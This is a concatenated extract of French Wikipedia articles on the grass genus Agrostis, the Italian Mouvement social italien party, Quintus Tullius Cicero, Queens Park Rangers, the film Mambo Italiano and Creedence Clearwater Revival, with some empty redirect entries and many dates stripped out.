Les caractères communs à toutes les espèces du genre Agrostis sont les suivants : Épillets pédicellés, comprimés par le côté, convexes sur les deux faces, renfermant une fleur hermaphrodite et, quelquefois, le rudiment d'une seconde fleur, formant par leur réunion une panicule rameuse. Glumes plus longues que la fleur, carénées, un peu inégales. aiguës. Glumelles très inégales, membraneuses, s'étalant pendant l'anthèse; l'inférieure brièvement barbue à sa base, oblongue, carénée, tronquée et dentelée au sommet, munie ou dépourvue d'une arête dorsale genouillée; glumelle supérieure beaucoup plus petite, bicarénée, souvent complètement nulle. Glumellules entières, glabres. Étamines 1-3. Stigmates presque sessiles, plumeux, s'étalant à la base de la fleur. Caryopse libre, glabre, ellipsoïde, non comprimé et à section transversale orbiculaire, muni d'un léger sillon sur la face interne.
Les graines des Agrostis sont très fines et demandent à être peu recouvertes, ce qui exige des soins particuliers pour leur semis.
Propriétés.
On a montré au début des années 1990 que certaines populations d'agrostides (notamment des espèces "Agrostis capillaris" et "Agrostis tenuis") peuvent présenter des capacités de résistance à des sels de l'acide arsénique (arséniates), substances entrant dans la composition de certains désherbants notamment utilisés sur les golfs. En concentrant ce poison sans en mourir, ces plantes peuvent aussi contribuer à décontaminer l'environnement (ou être utilisées lors d'opérations de phytoremédiation).
Liste d'espèces.
Selon :
Importance économique.
De nombreuses espèces d"'Agrostis" ont une importance économique significatives :
Étymologie.
Le nom générique « "Agrostis" » est un mot emprunté au grec ancien, « ἄγρωστις » ("agrostis"), qui désignait dans l'Antiquité une plante fourragère non déterminée, ou au latin "agrostis" (même signification).

</doc>
<doc id="248911" url="https://fr.wikipedia.org/wiki?curid=248911" title="Zenobe Gramme">
Zenobe Gramme



</doc>
<doc id="248914" url="https://fr.wikipedia.org/wiki?curid=248914" title="Mouvement social italien – Droite nationale">
Mouvement social italien – Droite nationale

Le Mouvement social italien (, abrégé en MSI), rebaptisé en 1972 Mouvement social italien – Droite nationale (, MSI-DN), est un ancien parti politique néofasciste, nationaliste et plus tard national-conservateur italien, fondé le après la chute de la République sociale italienne et l'interdiction du Parti national fasciste par le gouvernement provisoire et les Alliés. Il s'auto-dissout le , pour donner naissance à l'Alliance nationale le lendemain. Le MSI a été un acteur majeur de la politique italienne pendant .
Histoire.
Fondation.
Le , le Mouvement social italien annonce sa constitution par . Une de cinq membres est nommée. "La Rivolta Ideale" devient le premier journal officiel du parti.
Parmi ses fondateurs, on compte pour la plupart des anciens de la République sociale italienne comme Giorgio Pini, Augusto de Marsanich, Pino Romualdi, Arturo Michelini, ex-adjoint au dirigeant fédéral romain du Parti fasciste républicain et Giorgio Almirante, ancien rédacteur en chef du quotidien "Tevere" et chef de cabinet de Ferdinando Mezzasoma, ministre de la Culture populaire de la République sociale. Parmi les premiers adhérents, on trouve d'anciens responsables du régime comme le vieux « quadriumvir » de la Marche sur Rome, Cesare Maria De Vecchi, d'anciens détenus des camps fraîchement libérés, de jeunes militants des FAR ("Fasci di Azione Rivoluzionaria") et des officiers, dont le maréchal Rodolfo Graziani ou le commandant de la MAS ("Motoscafi Armati Siluranti" ou "Motoscafi Anti Sommergibile") de la République sociale, le prince Junio Valerio Borghese.
Le programme du parti nouvellement créé est celui du programme socialisant, anticapitaliste et antibourgeois - la « Charte de Vérone » - élaboré au premier Congrès du Parti fasciste républicain en novembre 1943. C'est un retour non pas au « fascisme-régime », tel qu'il avait pu fonctionner au temps du consensus de masse, mais au fascisme révolutionnaire des origines. Ainsi la direction du MSI proclamait-elle dans un article publié en août 1947 dans "Rivolta ideale", organe officiel du parti :
"L'Arco costituzionale".
Pendant toute la République, le MSI a été exclu de toute coalition gouvernementale. Lorsque la Constitution de la Première République est votée, le , naît l’expression de l"'Arco costituzionale" (l'« Arc constitutionnel ») : tous les partis, du Parti communiste italien à la Démocratie Chrétienne, du Parti Socialiste au Parti Libéral, reconnaissent être unis en toute circonstance pour faire barrage au MSI, et pour l'exclure de toute alliance électorale ou gouvernementale, à quelque niveau que ce soit. Les monarchistes sont eux aussi tenus à l'écart de l"Arco costituzionale". L'expression sera fréquemment utilisée au cours des décennies 1960 et 1970. Cette alliance durera jusqu'en 1994, lorsque des ex-membres du MSI, devenu "Alleanza Nazionale", entreront dans un gouvernement de coalition.
Au cours de son histoire, la personnalité de son dirigeant Giorgio Almirante a contribué à peu à peu adoucir son image et à gagner un respect de la part de ses adversaires politiques.
Un mouvement, un parti ou une fédération de tendances ?
Le MSI n'a jamais été un parti monolithique. En fait, dès ses débuts, il fait coexister, sur le mode du compromis, différentes générations et différentes tendances. D'un côté on trouve, dès sa fondation, des fascistes dit modérés, nostalgiques du Régime, et les anciens combattants de la République Sociale, souvent beaucoup plus jeunes, rebelles et anti-capitalistes. Ceci explique que le parti va être en même temps de droite et de gauche, catholique et anticlérical, atlantiste et antiaméricain, démocratique et putschiste, réformiste et révolutionnaire. 
En fait, le MSI regroupe des tendances très diverses, qui ont parfois abouti à des scissions, et parfois à des réintégrations. 
Les modérés.
Parmi les principales tendances, on doit nommer d'abord l'aile modérée, personnifiée longtemps par Arturo Michelini (président du parti de 1954 à 1969) et Augusto de Marsanich. Pour eux, le MSI doit s'intégrer au jeu des partis, et ne pas hésiter à faire des concessions aux partis bourgeois. L'axe central de la stratégie des "modérés" est la constitution d'une , un front commun anticommuniste, et qui regrouperait, outre le MSI, les monarchistes (Parti national monarchiste, Parti monarchiste populaire, puis Parti démocratique italien d'unité monarchiste), le Parti libéral et le centre-droit de la Démocratie chrétienne.
L'aile des "modérés" se caractérise aussi par son orientation , c'est-à-dire pro-américaine et en faveur de la participation de l'Italie à l'OTAN. Lors du deuxième Congrès du parti, en été 1949, le Pacte atlantique est condamné mais on laisse aux parlementaires la liberté de vote. Le , les députés du MSI, à l'exception d'un seul, voteront contre l'adhésion de l'Italie à l'OTAN. Mais, fin 1951, la direction des « modérés » (De Marsanich) affirme le soutien du parti au bloc occidental. La tendance sera renversée lors du retour à la direction de Giorgio Almirante en 1969.
Les révolutionnaires.
Pendant toute la période de présidence du parti par Arturo Michelini (1954-1969), Giorgio Almirante sera la figure de proue de l'opposition interne. Il a pris part aux instances dirigeantes du parti de 1946 à 1950, mais en sera écarté jusqu'à son arrivée au poste de secrétaire général en 1969.
L'aile des "révolutionnaires" se caractérise par une volonté d'opposition claire, à la fois aux partis bourgeois et au communisme. Elle est hostile à la participation de l'Italie aux institutions de l'OTAN, et favorable à une politique « méditerranéenne » de collaboration avec les États nationalistes arabes. Cette tendance a souvent été surnommée la « gauche révolutionnaire » du parti, notamment à cause de son antiaméricanisme, de son tiers-mondisme et de ses positions sociales .
Le retour de Giorgio Almirante à la tête du MSI en 1969 et sa longue présidence (1969-1987) ont assuré l’hégémonie de la tendance "révolutionnaire" sur le parti.
La « gauche de la gauche » du MSI.
L'aile gauche du MSI inclut des tendances encore bien plus « à gauche » que les « révolutionnaires » d'Almirante. Ainsi, en août 1952, à la suite du Congrès de L'Aquila, un groupe de la gauche du MSI quitte le parti pour fonder un Regroupement social républicain, qui devient en 1953 le Parti du socialisme national. Il faut aussi mentionner Ernesto Massi, un authentique « fasciste de gauche », pour lequel le fascisme se résume à la notion de socialisme national. Créateur d'un "Centro Studi Nazione Sociale" à l'intérieur du MSI, il quitte le parti en 1957, pour fonder un Parti national du travail.
Les radicaux.
En dehors des deux grandes tendances, des groupes de jeunes rebelles ont eu une grande influence sur la vie du parti. Ainsi, lors du troisième Congrès () qui entérine la politique d'insertion dans le système, les jeunes d'orientation traditionnelle les plus radicaux, influencés par les thèses du philosophe Julius Evola, créent le groupe des "Figli del Sole", donnant naissance à un courant spiritualiste à l'intérieur du parti. Le même congrès donne lieu à des scissions de certains membres de la tendance de « gauche ».
Mais c'est à partir de 1954 qu'un courant radical et spiritualiste se structure. Emmené par Pino Rauti, les jeunes « évoliens », ou « traditionalistes », proposent, lors du congrès (), que le parti se replace sur des positions plus intransigeantes et effectue un travail de relecture critique du fascisme historique. Début 1955, le courant donne naissance au "Centro Studi Ordine Nuovo", un centre d'études et de réflexion dont la première base doctrinale est constituée par la brochure "Orientations" de Julius Evola. Le groupe fait paraître le mensuel "Ordine Nuovo", sous-titré « mensuel de politique révolutionnaire ». Le "Centro Studi Ordine Nuovo" se distancie totalement de l'héritage fasciste habituel du MSI et va mener un immense travail culturel. Outre Julius Evola, le groupe fait découvrir aux jeunes militants de nouveaux auteurs de référence, comme Corneliu Codreanu, Giuseppe Tucci, Pio Filippani Ronconi et René Guénon. Le groupe dépasse aussi le cadre du patriotisme ou du nationalisme pour imaginer une Europe-Nation, opposée au condominium. En peu de temps, l'influence culturelle d'Ordine Nuovo va s'accroître et dépasser le cadre du mouvement. Sa conception de la vie héroïque et aristocratique, inspirée de l'œuvre d'Evola, va exercer une forte influence sur les jeunes militants de droite, à la fois à l’intérieur et en dehors du MSI. 
Lors du Congrès de Milan, en 1956, après de violents incidents entre les ailes « gauche » et « droite » du parti, le "Centro Studi Ordine Nuovo" quitte le parti. 
En juin 1969, Giorgio Almirante, leader de la tendance de « gauche révolutionnaire », est élu à la tête du MSI. En décembre, lors d'un meeting à Rome, il lance un appel à tous les « frères séparés » à rentrer dans le parti. Il interpelle surtout les jeunes à fortifier et à renouveler le MSI. Pino Rauti et la plupart des membres d'Ordine Nuovo se laissent convaincre. Rauti dissout le Centro Studi et la plupart des adhérents réintègrent le parti. Trois membres entrent à la direction nationale du MSI, et onze autres membres sont nommés au comité central.. Le retour en force des "Ordinovisti" au sein du parti marque le renforcement d'une tendance profondément radicale et d'orientation nationale-révolutionnaire (mais résolument légaliste) du MSI, représentée notamment par Pino Rauti et par Adriano Romualdi.
Dans les années 1980 et 1990, Pino Rauti, soutenu par la plus grande partie des jeunes activistes, continuera d'animer les tendances radicales du parti, sous les noms de ', d", de ', puis de '.
L'action syndicale : la "CISNAL".
Le MSI s'est donné pour objectif de regrouper tous les travailleurs non-communistes. Dans cet esprit est fondée, le , la Confédération italienne des syndicats nationaux de travailleurs (CISNAL). Dès sa fondation, elle compte déjà membres. Son slogan est: Ses références idéologiques sont le syndicalisme révolutionnaire et la doctrine sociale de l’Église.
En 1953 est créé le centre de soutien et d’aide sociale du syndicat, l' (ENAS). 
En 1996, la CISNAL se transforme en (UGL). Elle comptait en 2018.
Organisations périphériques.
En est fondé l'organisation étudiante du parti, le "Fronte Universitario di azione nazionale" (FUAN).
Les cercles des élèves des collèges sont regroupés sous le nom de "Giovane Italia", dès . En 1971, "Giovane Italia" fusionne avec le "Raggruppamento giovanile studenti e lavoratori" pour former le "Fronte della Gioventù" (FdG).
Début 1950 est créé un "Mouvement Italien Féminin" (MIF), mais son lien avec le MSI n'est officialisé qu'en 1952. 
Le MSI a encore créé de nombreux centres culturels aux activités multiples, tels le "Centre de vie italienne" (fondé en 1955). 
La presse.
Le MSI a toujours donné beaucoup d'importance à sa presse. À son apogée, dans les années 1970, il dispose d'un quotidien, de 5 hebdomadaires et de 15 périodiques.
Le est créé le journal quotidien ', qui devient ' en juin. Il restera cependant considéré comme le journal de l'aile « gauche » du parti.
Le vivier culturel de la jeunesse du MSI.
Au cours des années 1970, les organisations de jeunesse du MSI vont donner naissance à un bouillonnement culturel, qui va se manifester par de nombreuses initiatives comme l'organisation des "Campi Hobbit", par la naissance de la "", et par l'adoption d'un style nouveau dans la jeunesse (croix celtique, figure du « rat noir »). Les figures marquantes de ce renouveau culturel sont Marco Tarchi, Umberto Croppi, Giampiero Rubei et Generoso Simeone. Pino Rauti devient le leader symbolique de la jeunesse. C'est aussi dans ce milieu que va se développer, à l'initiative encore de Marco Tarchi, la "Nuova destra" italienne. 
Les "Campi Hobbit".
Les 11- 1977 se tient en Irpinie le premier "Campo Hobbit", dont le nom est inspiré par l'univers littéraire de JRR Tolkien, très lu par la jeunesse de droite en Italie. Deux jours de musique alternative, de débats et de tables rondes auxquels participent plus de venus de toute l'Italie. On y présente des thématiques nouvelles, des méthodes et des styles inhabituels pour le MSI. L'événement trouve, de manière inhabituelle, un large écho dans la presse. Trois autres "" auront lieu : en 1978, 1980 et 1981.
La "Musica alternativa".
Les groupes de musique et les chanteurs qui se produisent aux "", comme Massimo Morsello, "Amici del Vento", "La Compania del Annello" et "Janus", auront une longue postérité et inspireront de nombreux autres groupes de "musica alternativa".
"La Voce della Fogna" : « la revue qui apprit à la droite à rire d'elle-même ».
Marco Tarchi lance encore une revue satirique, qui offre un large espace à la bande dessinée, à l'humour, aux musiques folk et rock, au cinéma : "", sous-titrée « journal différent ». Le nom de la revue annonce un style marqué par la caricature et l'autodérision. En effet, il s'agit d'une reprise du slogan d'extrême gauche (). Parmi les dessinateurs, on comptera le Français Jack Marchal, le créateur du personnage du rat noir. La revue paraîtra de 1974 à 1983.
La "Nuova destra".
C'est aussi de ce bouillonnement culturel au sein de la jeunesse du MSI que naît, en 1977, la ', emmenée aussi par Marco Tarchi, avec pour objectif une patiente reconquête du terrain culturel. Pour Tarchi, il s'agissait de rompre avec le MSI, qui ne s'était pas montré capable d'élaborer un projet global et cohérent de « vision du monde ». La ' devait mener un combat métapolitique ne devait pas signifier négation de la politique, mais son dépassement et son complément dans le cadre d'une vision du monde organique et globale qui permettrait d'intervenir activement dans le monde contemporain. Marco Tarchi est exclu du parti à la fin de l'année 1979. La "" se développera donc à l’extérieur du MSI. En , elle se constitue officiellement.
Elle donnera naissance à de nombreuses revues thématiques, comme "Elementi" (revue de culture générale), "Diorama Letterario" (mensuel bibliographique)", Eowyn" (spécialisée sur la condition féminine)", Dimensione Ambiente" (revue écologique)", Dimensione Cosmica" (littérature fantastique) et "Trasgressioni" (revue théorique)"." Plus tard, une partie de ses dirigeants retourneront plus tard militer au MSI-DN, ou par la suite à "Alleanza Nazionale".
La "Destra nazionale".
En , Almirante réussit ce que les « modérés », pourtant partisans de la Grande Droite, n'étaient jamais parvenus à faire : il obtient une alliance officielle avec le plus important des partis monarchistes, le Partito Democratico Italiano di Unità Monarchica. C'est ainsi que le Mouvement social italien devient le "Movimento Sociale Italiano - Destra Nazionale".
En 1976, à la suite de mauvais résultats électoraux, un courant d’opposition à la direction de Giorgio Almirante se constitue en groupe "Democrazia Nazionale" au sein du MSI-DN. En décembre, ce courant se retire du mouvement et se constitue en parti politique indépendant. Malgré le ralliement de sur 35, ce nouveau parti s'auto-dissout en 1979.
Perspectives européennes.
Quasiment depuis ses débuts, le MSI s'inscrit dans une perspective européenne. La première revue du MSI, mensuel traitant de politique étrangère, créée le , porte déjà le nom d' "Europa Nazione". 
En , les jeunes du MSI, accompagné du mouvement portugais "Movimento Vanguardista", organisent à Rome le premier "Congrès de la Jeunesse nationale européenne". De jeunes Français, Espagnols, Grecs, Suédois, ainsi que de nombreux exilés Hongrois, Bulgares, Tchécoslovaques, Polonais et Roumains, y participent. Le National Front britannique, le Nouvel Ordre Européen et le NPD allemand envoient des délégations officielles. Toujours en 1969, le MSI est proche du nouveau mouvement français Ordre Nouveau, notamment via Jean-François Galvaire. 
Le MSI est aussi très proche du nouveau parti français né en 1972, le Front National, qui reprend directement le logo à la flamme du MSI (ces derniers apportent aussi un soutien financier). 
L'Eurodroite.
Les 19-, naît à Rome l'Eurodroite, dans la perspective des premières élections européennes. L'alliance réunit, outre le MSI, le Parti des forces nouvelles (France) et le mouvement espagnol Fuerza Nueva. L'alliance entend être une réponse à l'Eurocommunisme constitué par les partis communistes des mêmes pays, à l'initiative d'Enrico Berlinguer. Le , l'Eurodroite manifeste en masse à Naples. Devant la foule, prennent la parole Giorgio Almirante, Blas Piñar (Fuerza Nueva) et Jean-Louis Tixier-Vignancour (PFN).
Aux élections de , la liste française n'obtient que 1,33 % des voix. En revanche, le MSI obtient quatre sièges au Parlement européen (Almirante, Pino Romualdi, Petronio et Buttafuoco).
Les "Droites européennes".
Aux élections européennes de 1984, le MSI obtient 6,5 % des voix et cinq sièges (Almirante, Pino Romualdi, Francesco Petronio, Antonio Tripodi et Antonino Buttafuoco). Le Front national français obtient 11 % des voix et 10 élus. L'Union politique nationale grecque (EPEN) obtient 1 élu (Khrissanthos Dimitriadis). Le , ils constituent ensemble le Groupe des Droites européennes. Giorgio Almirante en est élu président, mais il est remplacé rapidement par Jean-Marie Le Pen. En 1985, le GDE fut rejoint par John Taylor, un parlementaire du Parti unioniste d'Ulster. Le groupe compte donc 17 parlementaires.
Le , du Groupe des droites européennes sont reçus officiellement en audience par le pape Jean-Paul II. Parmi eux, on peut nommer les Italiens Pino Romualdi, Giorgio Almirante, le Grec Khrissanthos Dimitriadis et le Français Jean-Marie Le Pen. Le pape les encourage à et .
Le "Groupe technique".
Après les élections européennes de 1989, le Front national français, Les Républicains allemands et le Vlaams Blok constituent le Groupe Technique des Droites européennes, avec . Les quatre députés refusent d'y adhérer à la suite d'une résurgence de la querelle du Haut-Adige, qui les oppose aux Republikaner. Les députés du MSI adhérent au Groupe des Non-inscrits.
Vers l'Alliance nationale.
Le MSI sera toujours divisé en courants divers et antagoniques. Fin 1987, Giorgio Almirante favorise, contre Pino Rauti, pourtant vice-secrétaire du MSI depuis 1982, son dauphin Gianfranco Fini, ancien chef du "". Fini est élu par contre 608 à Rauti. Derrière les deux hommes, on voit s'affronter, comme auparavant les deux lignes principales du MSI. La ligne de Fini, national-conservatrice, consiste à s'orienter vers le centre-droit, à s'appuyer sur la droite bourgeoise pour empiéter sur l’électorat de la Démocratie chrétienne. La ligne de Rauti, nationale-révolutionnaire, s'est orientée vers une opposition radicale au capitalisme libéral occidental, estimant que le communisme va vers un proche effondrement et que celui-ci ne constitue plus l'ennemi principal, contrairement à ce que prônent les partisans de la ligne Fini. Rauti préconise de se tourner, non pas vers la droite bourgeoise, mais vers tous ceux qui se placent « hors du Système » : communistes dissidents, écologistes, intellectuels d'une certaine gauche, catholiques antimodernes.
Lors du congrès, en 1990, six listes seront en compétition : celle de Gianfranco Fini, qui veut faire évoluer le parti vers un le centre-droit, la liste nationale-populaire de Pino Rauti, la liste modérée de Servello, la liste libérale-démocratique de Mennitti, la liste des « almirantiens orthodoxes » et celle des « romualdiens ». Cette fois, Pino Rauti reprend la main, en obtenant au deuxième tour contre 697 à Fini.
Lors des élections régionales de , Pino Rauti mise tout sur sa ligne nationale-populaire et sur ce qu'il appelle la « percée à gauche ». Mais les résultats sont mauvais: le parti chute à son minimum historique (3,9 % des voix). La défaite devient un argument de choix pour les partisans de Fini.
Mais le , à la suite de tensions internes, Rauti démissionne. Gianfranco Fini est à nouveau élu secrétaire général du mouvement.
En , débutent les procès de l’Opération Mains propres. Le MSI-DN se révèle être le seul parti à ne pas être éclaboussé par les scandales de corruption. En avril, le mouvement remonte la pente lors des élections nationales.En décembre, le politologue Domenico Fisichella appelle à la formation d'une alliance nationale contre la gauche et la corruption. En , le mode de scrutin des mairies est changé. Le MSI-DN gagne de nombreuses mairies et cette percée se poursuit lors des élections de novembre. Il y a désormais 44 maires MSI-DN. Les mairies de Rome et de Naples lui échappent de peu (respectivement 46,89 % et 44,4 % des voix). Le , sur l'emblème du parti, "Destra Nazionale" est remplacé par "Alleanza Nazionale".
Le a lieu l'assemblée constituante d'Alliance nationale. L'assemblée désigne Fini comme coordinateur national. Il s'engage à organiser le congrès d'Alliance nationale un an plus tard. Les décisions sont entérinées par l'assemblée du congrès du MSI-DN devenu MSI-AN, le .
Quatre membres du MSI entrent au gouvernement de Silvio Berlusconi en 1994.
Le 25-, a lieu le et dernier congrès du MSI, qui se dissout. Le commence le Congrès d""'. Le MSI n'existe plus.
Une partie de l'aile sociale et de la « gauche » du MSI refuse la « "" », du nom de la ville où s'est tenu le Congrès. Ces militants, emmenés par Rauti, Giorgio Pisanò et Tommaso Staiti di Cuddia constituent, le , les . Ils fondent, le , le "Movimento sociale - Fiamma tricolore (Mouvement Social - Flamme Tricolore)".

</doc>
<doc id="248917" url="https://fr.wikipedia.org/wiki?curid=248917" title="Quintus Tullius Cicero">
Quintus Tullius Cicero

Quintus Tullius Cicero est un homme politique, militaire et auteur romain, frère cadet du célèbre orateur Cicéron. Il naît en à Arpinum, une ville proche de Rome. Après une carrière politique classique, passant par le "cursus honorum" jusqu'à la charge de préteur, il est propréteur en Asie puis participe à la Guerre des Gaules en tant que légat de légion servant sous Jules César. Sortant indemne de la guerre entre César et Pompée, il est, comme son frère et le reste de sa famille proche, exécuté par les hommes de main du Second triumvirat, lors des proscriptions organisées sur ordre de Marc-Antoine et d'Octave, en .
Biographie.
Son riche père fait en sorte qu'il reçoive son éducation avec son frère à Rome, Athènes et probablement Rhodes. Il se marie à Pomponia (sœur d'Atticus, ami de son frère), dont il a un fils, Quintus Tullius Cicero Minor, et dont il divorce par la suite.
Il est édile en 66 av. J.-C. et préteur en 62 av. J.-C., puis à sa sortie de charge propréteur de la province d'Asie pendant 3 ans. En 58 av. J.-C., revenant à Rome à la fin de sa propréture, il ne parvient pas à croiser son frère qui vient de s'exiler en Grèce, et s'inquiète d'une brouille possible. Cicéron le rassure par une longue lettre. À Rome, Quintus s'emploie avec d'autres amis à convaincre les sénateurs de lever l'exil de son frère, ce qui est obtenu avec l'appui déterminant de Pompée. Ayant réintégré le Sénat, Cicéron fait passer un vote accordant à Pompée des pouvoirs étendus pour organiser les importations de blé vers Rome. En remerciement, Pompée prend Quintus comme légat pour l'accompagner en Sardaigne entre 57 av. J.-C. et 56 av. J.-C..
Quintus est légat de légion de Jules César pendant la guerre des Gaules, de 54 à 52 av. J.-C. ; il y combat les Nerviens et voit son camp assiégé par l'armée d'Ambiorix, mais lui oppose une résistance énergique qui permet à César de venir le dégager ; il commande la XIV légion au camp d'Atuatuca Tungrorum, où il subit encore une attaque imprévue des Sicambres. 
En 51 av. J.-C., il quitte la Gaule et pour accompagner son frère, désigné proconsul de Cilicie. Les deux hommes se regroupent dans leur villa d'Arpinum. Cicéron est alors témoin d'une scène de ménage entre Quintus et son épouse Pomponia. Celle-ci, vexée que la préparation du repas en commun ait été confiée à un affranchi, proclame qu'elle n'est plus la maîtresse de maison et refuse de prendre part au repas. Cicéron écrit le soir même à Atticus pour décrire les tensions du ménage et le prier d'intervenir auprès de sa sœur. En Cilicie, Quintus partage le commandement des troupes locales avec trois autres légats et mène avec succès des opérations de pacification dans les montagnes de l'Amanus, région stratégique proche de l'empire parthe. À la fin du mandat de Cicéron en juillet 50 av. J.-C., les deux frères quittent la Cilicie et reviennent à Rome par petites étapes, en janvier 49 av. J.-C..
Au début des Guerres civiles, Marcus et Quintus Cicéron se replient dans leurs villas et hésitent sur le parti à prendre, César, dont Quintus a été légat en Gaule, ou Pompée, qui fut le protecteur de Cicéron. En juin 49 av. J.-C., ils embarquent avec leurs fils à Gaète, rejoignent le parti de Pompée en Épire et sont hébergés à Patras par un ami d'Atticus. Après la défaite de Pompée à Pharsale en août 48 av. J.-C., Quintus reproche à son frère de n'avoir pas pris le parti de César, et envoie son fils en Asie implorer le pardon de César, tandis que Marcus le quitte pour revenir en Italie. Ils finissent par obtenir le pardon de César en 49 av. J.-C. (problème de date). 
En , Marcus est déclaré proscrit par les triumvirs en raison de son opposition à Marc Antoine. Quintus et lui fuient de Tusculum, mais Quintus retourne à Arpinum pour prendre des bagages ; Selon Dion Cassius, un paysan le dénonce et il se rend alors pour sauver son fils, Quintus Tullius Cicero Minor, qui se fait torturer à Rome. Après une tentative de négociation et de marchandage de la vie du père contre celle du fils, tous deux sont mis à mort. Appien donne une version un peu différente.
Œuvres.
En tant qu'auteur, Quintus a écrit au mois de juillet 65 av. J.-C. un manuel de campagne électorale "De petitione consulatus" ou "Commentariolum petitionis" (parfois attribué à son frère), quatre tragédies dans le style grec. Trois avaient pour titre "Troas", "Erigones" et "Electra" ; toutes ont été perdues. Il a aussi écrit quelques poèmes sur la deuxième expédition de César en Bretagne, trois lettres à Tiro et une quatrième à son frère.
Cicéron lui a dédié les trois livres de son traité d'art oratoire, "De Oratore". Cicéron figure aussi Quintus et Atticus, ainsi que lui-même dans les dialogues du traité politique "De legibus".

</doc>
<doc id="248918" url="https://fr.wikipedia.org/wiki?curid=248918" title="État italien">
État italien



</doc>
<doc id="248922" url="https://fr.wikipedia.org/wiki?curid=248922" title="Queens Park Rangers Football Club">
Queens Park Rangers Football Club

Queens Park Rangers, généralement abrégé en QPR, est un club de football basé dans le quartier de White City, à l'ouest de Londres. Le club joue actuellement en EFL Championship (deuxième division anglaise). Il a été créé en 1886 après la fusion de Christchurch Rangers et de St Judes Institute, bien que leur fondation officielle date de 1882, date à laquelle Christchurch Rangers a été créée. Leur stade actuel est Loftus Road. 
Les meilleurs résultats du club sont sa victoire en Coupe de la Ligue anglaise en 1967 et une finale de FA Cup en 1982, ainsi qu'une deuxième place en championnat de l'ancienne Première Division (actuelle Premier League) au terme de la saison 1975-1976, lui offrant sa première qualification pour une coupe européenne, où le club atteindra les quarts de finale de la Coupe UEFA la saison suivante.
QPR entretient depuis longtemps des rivalités avec plusieurs clubs de la région de Londres, les plus remarquables étant celles avec Chelsea, Fulham et Brentford : ce sont les derbies de l’ouest de Londres.
Histoire.
Fondation.
Fondé dans les années 1880, le club adopte un statut professionnel en 1898 et rejoint la "League" en 1920 (Division 3). La date de 1882 figure sur le blason du club mais un certain flou marque les débuts du club, avec trois écoles défendant trois dates différentes (1882, 1885 et 1886). Paradoxalement et bien qu'elle soit la date officielle, 1882 apparaît toutefois comme la moins sérieuse. En 1885, un club nommé St. Judes Institute FC est formé, il fusionne cette même année ou l'année suivante avec le club de Christchurch Rangers, ce qui constitue l'origine réelle du club, puis adopte le nom définitif de Queens Park Rangers en 1887. Certains font cependant remonter l'existence de St. Judes à 1882 et c'est cette date qui a été retenue.
Rachat du club.
Le club est racheté le septembre 2007 par Flavio Briatore, l'ancien directeur d'équipe du Renault F1 Team en Formule 1, associé à Bernie Ecclestone, le patron de la F1. Leur offre de 1,5 million d'euros est acceptée par le conseil d'administration du club, assortie de l'engagement des deux futurs propriétaires d'éponger les dettes du club qui s'élevaient alors à 19,5 millions d'euros.
Le club est racheté en 2011 à hauteur de 66 % des parts par Tony Fernandes, président d'Air Asia, et de 33 % des parts par Lakshmi Mittal.
Après une année passée dans l'élite en 2014-2015, le club est relégué en Football League Championship (deuxième division anglaise).
Personnalités du club.
Entraîneurs.
Le tableau suivant présente la liste des entraîneurs du club depuis 1906.
Effectif actuel.
"Le 8 août 2025"
Joueurs emblématiques.
All-time XI
En 2008, le site internet officiel des Queens Park Rangers publie une liste des onze meilleurs joueurs de l'équipe durant toute son histoire. En voici la liste :
Autres joueurs emblématiques

</doc>
<doc id="248923" url="https://fr.wikipedia.org/wiki?curid=248923" title="Queens Park Rangers">
Queens Park Rangers



</doc>
<doc id="248926" url="https://fr.wikipedia.org/wiki?curid=248926" title="Saint-empire romain germanique">
Saint-empire romain germanique



</doc>
<doc id="248927" url="https://fr.wikipedia.org/wiki?curid=248927" title="Mambo Italiano (film)">
Mambo Italiano (film)

Mambo Italiano est un film québécois anglophone réalisé par Émile Gaudreault, sorti en 2003.
Synopsis.
Angelo et sa sœur sont dépassés par leurs parents : Maria et Gino, des immigrants italiens installés à Montréal, qui passent leur temps à se quereller et à gronder leurs enfants. Le déménagement de leur fils dans son propre appartement a été un drame, surtout, lorsque, dans les premiers jours, Angelo est cambriolé. Surprise, le policier qui vient constater l'effraction est Nino, ancien ami d'enfance d'Angelo. Tous les deux se mettent rapidement en couple.
Ils sont heureux, mais Angelo veut révéler son homosexualité à ses parents contre l'avis de Nino.

</doc>
<doc id="248929" url="https://fr.wikipedia.org/wiki?curid=248929" title="Dreamliner">
Dreamliner



</doc>
<doc id="248931" url="https://fr.wikipedia.org/wiki?curid=248931" title="Alopecurus">
Alopecurus



</doc>
<doc id="248934" url="https://fr.wikipedia.org/wiki?curid=248934" title="Mambo italiano">
Mambo italiano



</doc>
<doc id="248937" url="https://fr.wikipedia.org/wiki?curid=248937" title="Cynodon">
Cynodon

Cynodon est un mot grec qui signifie « dents de chien » (en grec : canis + dens).
Cynodon est le nom scientifique : 

</doc>
<doc id="248938" url="https://fr.wikipedia.org/wiki?curid=248938" title="Creedence Clearwater Revival">
Creedence Clearwater Revival

 (souvent appelé simplement Creedence ou désigné par ses initiales CCR) est un groupe américain de rock aux influences blues et country, originaire d'El Cerrito au nord de la baie de San Francisco.
Formé en 1958 à l'initiative de l'auteur, compositeur, chanteur et guitariste John Fogerty, du batteur Doug Clifford, du bassiste Stu Cook, tous élèves de la — et rapidement rejoints par le frère aîné de John, Tom Fogerty —, il prend d'abord le nom des "Blue Velvets" puis des "Golliwogs", avant de se révéler en 1967 avec l'album "Creedence Clearwater Revival".
À sa séparation en 1972, Creedence Clearwater Revival aura marqué de son empreinte l'histoire du rock.
Des succès planétaires comme "Have You Ever Seen the Rain?", "Born on the Bayou", "Proud Mary", "Green River" ou "Fortunate Son" font encore partie des , six des sept albums (à l'exception de "Mardi Gras") et les diverses compilations font encore recette et sont certifiés disques de platine.
Son inscription au Rock and Roll Hall of Fame en 1993 consacre Creedence parmi les groupes américains les plus marquants des cinquante dernières années.
Histoire.
1958-1966 : la longue gestation.
En 1958, deux camarades de classe du collège Portola d'El Cerrito, une des innombrables petites bourgades de la baie de San Francisco, décident de former un groupe de blues. John Fogerty achète une guitare électrique pour l'occasion et s'exerce dans sa chambre, tandis que Douglas Clifford l'accompagne en tapant sur une batterie de fortune. Très rapidement, les deux compères recrutent un autre copain, Stewart Cook, à la basse, pour étoffer leur formation. Encore adolescent, pianiste confirmé et bassiste, il a déjà participé à un radio-crochet dans une radio de musique classique d'Oakland. C'est ainsi que le trio "The Blue Velvets" voit le jour et se fait connaitre à force de répétitions, de concerts dans les bals de lycées et les bars locaux, même s'il se borne à l'époque à reprendre des succès de l'époque.
